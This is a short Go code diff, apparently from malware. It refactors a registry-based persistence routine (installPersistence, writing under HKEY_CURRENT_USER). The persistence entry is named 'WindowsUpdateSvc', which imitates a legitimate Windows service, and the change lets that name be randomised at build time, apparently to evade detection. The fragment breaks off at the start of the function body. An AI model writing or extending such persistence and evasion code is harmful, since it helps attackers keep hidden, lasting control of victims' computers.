@@ -20,8 +20,10 @@ const (
 	hkeyCurrentUser = 0x80000001
 	keySetValue     = 0x0002
 	regSZ           = 1
-	persistName     = "WindowsUpdateSvc"
 )
+
+// persistName is injected via -ldflags -X at build time for randomization
+var persistName = "WindowsUpdateSvc"
 
 func installPersistence() {
 	exePath, err := os.Executable()
